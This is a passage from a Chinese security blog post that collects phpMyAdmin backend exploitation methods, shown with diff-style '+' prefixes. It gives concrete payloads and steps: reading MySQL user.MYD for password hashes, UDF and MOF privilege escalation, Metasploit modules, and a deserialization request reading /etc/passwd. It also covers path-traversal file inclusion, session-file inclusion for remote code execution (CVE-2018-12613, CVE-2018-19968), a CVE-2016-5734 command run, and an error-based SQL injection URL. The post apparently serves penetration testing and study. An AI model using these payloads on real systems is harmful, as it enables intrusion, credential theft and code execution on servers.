+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;</code></pre></div>
+
+<p>user.MYD文件存储在@@basedir\data\mysql\user.MYD</p>
+<p>依次执行</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> ttt(ddd text);
+load data <span class="hljs-keyword">local</span> infile <span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\data\\mysql\\user.MYD&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> ttt fields terminated <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;&#x27;</span> LINES TERMINATED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;\0&#x27;</span>;
+<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ttt;</code></pre></div>
+
+<p>但是读取的不全，phpmyadmin中没法正常显示。</p>
+<p>渗透测试场景中，如果能够导出user.MYD文件，就可以进行hash 的获取。</p>
+<p>具体可以参考</p>
+<p><a target="_blank" rel="noopener" href="http://www.dengb.com/wzaq/1017388.html">获取MySQL中user.MYD中hash技巧</a></p>
+<h3 id="5-UDF提权"><a href="#5-UDF提权" class="headerlink" title="5. UDF提权"></a>5. UDF提权</h3><p><strong>条件</strong>：</p>
+<ul>
+<li>具有写权限</li>
+<li>插件目录可写（或者可以更改指定的插件目录）</li>
+</ul>
+<p>具体情况要看目标 mysql 的版本：</p>
+<ul>
+<li>Mysql version &gt; 5.1 时，dll 或者 so 必须位于 mysql 安装目录 libplugin 下，当对该目录具有写权限时可以利用，查看：<br><code>show variables like %plugin%;</code>// 查看插件目录</li>
+<li>5.0 &lt;= Mysql version &lt;5.1 时，需要导出至目标服务器的系统目录，如 C://Windows/System32</li>
+<li>Mysql version &lt; 5.0 时，目录可以自定义具体利用如下：</li>
+</ul>
+<p>具体流程可以参考：<a target="_blank" rel="noopener" href="https://coomrade.github.io/2018/09/12/MYSQL%E5%86%99shell%E4%B8%8E%E6%8F%90%E6%9D%83/">MYSQL写shell与提权</a></p>
+<h3 id="6-MOF-提权"><a href="#6-MOF-提权" class="headerlink" title="6. MOF 提权"></a>6. MOF 提权</h3><p>通过 <code>mysql</code> 将文件写入一个 <code>MOF</code> 文件替换掉原有的 <code>MOF</code> 文件，然后系统每隔五秒就会执行一次上传的 <code>MOF</code>。</p>
+<p>一般适用于 <code>Windows &lt;= 2003</code>，并且 <code>C:\Windows\System32\mof</code> 目录具有写权限（一般是没有权限写）。</p>
+<p>可以使用 <code>MSF</code> 直接利用：<code>exploit/windows/mysql/mysql_mof</code></p>
+<h2 id="0x03-可利用漏洞"><a href="#0x03-可利用漏洞" class="headerlink" title="0x03 可利用漏洞"></a>0x03 可利用漏洞</h2><h3 id="CVE-2013-3238"><a href="#CVE-2013-3238" class="headerlink" title="CVE-2013-3238"></a>CVE-2013-3238</h3><p>影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG<br>利用模块：exploit/multi/http/phpmyadminpregreplace</p>
+<h3 id="CVE-2012-5159"><a href="#CVE-2012-5159" class="headerlink" title="CVE-2012-5159"></a>CVE-2012-5159</h3><p>影响版本：phpMyAdmin v3.5.2.2<br>利用模块：exploit/multi/http/phpmyadmin3522_backdoor</p>
+<h3 id="CVE-2009-1151"><a href="#CVE-2009-1151" class="headerlink" title="CVE-2009-1151"></a>CVE-2009-1151</h3><p>PhpMyAdmin配置文件/config/config.inc.php存在命令执行<br>影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1<br>利用模块：exploit/unix/webapp/phpmyadmin_config<br>弱口令&amp;万能密码<br>弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码</p>
+<h3 id="低版本万能密码"><a href="#低版本万能密码" class="headerlink" title="低版本万能密码"></a>低版本万能密码</h3><p>版本2.11.3 / 2.11.4，用户名‘localhost’@‘@”则登录成功</p>
+<h3 id="WooYun-2016-199433：任意文件读取漏洞"><a href="#WooYun-2016-199433：任意文件读取漏洞" class="headerlink" title="WooYun-2016-199433：任意文件读取漏洞"></a><code>WooYun-2016-199433</code>：任意文件读取漏洞</h3><p>影响 phpMyAdmin<code>2.x</code> 版本</p>
+<div class="hljs code-wrapper"><pre><code class="hljs http">POST /scripts/setup.php HTTP/1.1 
+Host: your-ip:8080
+Accept-Encoding: gzip, deflate Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded Content-Length: 80
+action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</code></pre></div>
+
+
+
+
+
+<h3 id="CVE-2014-8959：本地文件包含"><a href="#CVE-2014-8959：本地文件包含" class="headerlink" title="CVE-2014 -8959：本地文件包含"></a>CVE-2014 -8959：本地文件包含</h3><p>影响范围：<code>phpMyAdmin 4 .0.1--4 .2.12</code>，需要 <code>PHP version &lt; 5.3.4</code></p>
+<div class="hljs code-wrapper"><pre><code class="hljs http">/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=
+/../../../../phpinfo.txt%00    # 注意改下token值</code></pre></div>
+
+<p>在实际利用中可以利用写入文件到 <code>/tmp</code> 目录下结合此漏洞完成 <code>RCE</code>.</p>
+<h3 id="CVE-2016-5734-：后台-RCE"><a href="#CVE-2016-5734-：后台-RCE" class="headerlink" title="CVE-2016-5734 ：后台 RCE"></a>CVE-2016-5734 ：后台 RCE</h3><p>影响范围：PhpMyAdmin<code>4 .0.x-4 .6.2</code>，需要 <code>PHP 4.3.0-5.4.6 versions</code></p>
+<div class="hljs code-wrapper"><pre><code class="hljs python">cve-<span class="hljs-number">2016</span>-<span class="hljs-number">5734.</span>py -u root --pwd=<span class="hljs-string">&quot;&quot;</span> http://localhost/pma -c <span class="hljs-string">&quot;system(&#x27;ls -lua&#x27;);&quot;</span></code></pre></div>
+
+<p>poc地址：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40185">https://www.exploit-db.com/exploits/40185</a></p>
+<h3 id="CVE-2018-12613：后台文件包含"><a href="#CVE-2018-12613：后台文件包含" class="headerlink" title="CVE-2018-12613：后台文件包含"></a>CVE-2018-12613：后台文件包含</h3><p><code>phpMyAdmin 4.8.0</code> 和 <code>4.8.1</code>，经过验证可实现任意文件包含。</p>
+<p>漏洞验证：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//y</span>our-ip:<span class="hljs-number">8080</span><span class="hljs-regexp">/index.php?target=db_sql.php%253f/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd</code></pre></div>
+
+<p>rce利用：包含session文件</p>
+<p>执行 <code>SQL</code> 语句，将 <code>PHP</code> 代码写入 <code>Session</code> 文件中：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();exit;?&gt;&#x27;</span></code></pre></div>
+
+<p>包含 <code>session</code> 文件：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs url">http:&#x2F;&#x2F;10.1.1.10&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_*** # *** 为phpMyAdmin的COOKIE值</code></pre></div>
+
+
+
+
+
+
+
+
+
+<h3 id="CVE-2018-19968：任意文件包含-RCE"><a href="#CVE-2018-19968：任意文件包含-RCE" class="headerlink" title="CVE-2018-19968：任意文件包含/RCE"></a>CVE-2018-19968：任意文件包含/RCE</h3><p>phpMyAdmin 4.8.0~4.8.3，利用如下：</p>
+<p>创建数据库，并将 <code>PHP</code> 代码写入 <code>Session</code> 文件中:</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> DATABASE foo;
+<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> foo.bar (baz <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">PRIMARY</span> KEY );
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> foo.bar <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>;</code></pre></div>
+
+<p>生成 <code>foo</code> 数据库的 <code>phpMyAdmin</code> 的配置表，访问：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.1.1.10</span>/chk_rel.php?fixall_pmadb=<span class="hljs-number">1</span>&amp;db=foo</code></pre></div>
+
+<p>篡改数据插入 <code>pma column_info</code> 中：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span>` pma__column_infoSELECT <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;baz&#x27;</span>, <span class="hljs-string">&#x27;plop&#x27;</span>,<span class="hljs-string">&#x27;plop&#x27;</span>, <span class="hljs-string">&#x27; plop&#x27;</span>, <span class="hljs-string">&#x27;plop&#x27;</span>,<span class="hljs-string">&#x27;../../../../../../../../tmp/sess_***&#x27;</span>,<span class="hljs-string">&#x27;plop&#x27;</span>; # <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> 为phpMyAdmin 的COOKIE值</code></pre></div>
+
+<p>这里要注意不用系统的 <code>session</code> 保存位置不同，具体系统可以在 <code>phpMyAdmin</code> 登录后首页看到</p>
+<ul>
+<li>MacOS<code>：</code>/var/tmp</li>
+<li>Linux<code>：</code>/var/lib/php/sessions</li>
+<li>phpStudy<code>：</code>/phpstudy/PHPTutorial/tmp/tmp</li>
+</ul>
+<p>访问包含 <code>Session</code> 文件的地址：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>tbl_replace.php?db<span class="hljs-operator">=</span>foo<span class="hljs-operator">&amp;</span><span class="hljs-keyword">table</span><span class="hljs-operator">=</span>bar<span class="hljs-operator">&amp;</span>where_clause<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>fields_name[multi_edit][][]<span class="hljs-operator">=</span>baz<span class="hljs-operator">&amp;</span>clause_is_unique<span class="hljs-operator">=</span><span class="hljs-number">1</span></code></pre></div>
+
+
+<h3 id="CVE-2020-0554-后台SQL注入"><a href="#CVE-2020-0554-后台SQL注入" class="headerlink" title="CVE-2020-0554 后台SQL注入"></a>CVE-2020-0554 后台SQL注入</h3><p>报错注入</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.209</span><span class="hljs-number">.139</span>:<span class="hljs-number">8001</span><span class="hljs-operator">/</span>server_privileges.php?ajax_request<span class="hljs-operator">=</span><span class="hljs-literal">true</span><span class="hljs-operator">&amp;</span>validate_username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>username<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">--+db=&amp;token=c2064a8c5f437da931fa01de5aec6581&amp;viewing_mode=server</span></code></pre></div>
+
+
+
+
+
+
+
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://xxxxx.com/sec/496.html#menu_index_3">phpmyadmin 后台 getshell 及漏洞利用</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#1-win-%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%EF%BC%9A">Mysql 在渗透测试中的利用</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43940853/article/details/104527925">利用phpmyadmin getshell(非实战，在本地环境下进行)</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="http://www.dengb.com/wzaq/1017388.html">获取MySQL中user.MYD中hash技巧</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulhub</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/138266875">phpMyAdmin后台SQL注入(CVE-2020-0554)</a></p>
+</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/phpmyadmin/">phpmyadmin</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/phpmyadmin/">phpmyadmin</a>
+                    
+                      <a class="hover-with-bg" href="/tags/getshell/">getshell</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/12/24/xdebug-v3-x-x%E9%85%8D%E7%BD%AE%E5%8F%98%E5%8C%96/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">xdebug v3.x.x配置变化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/30/php-htaccess%E5%88%A9%E7%94%A8/">
+                        <span class="hidden-mobile">php .htaccess利用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https://greydr34d.github.io/2020/11/21/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/';
+        this.page.identifier = '/2020/11/21/phpmyadmin-%E5%90%8E%E5%8F%B0-getshell-%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/';
+      };
+      Fluid.utils.waitElementVisible('disqus_thread', function () {
+        var d = document, s = d.createElement('script');
+        s.src = '//' + '' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener noopener">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
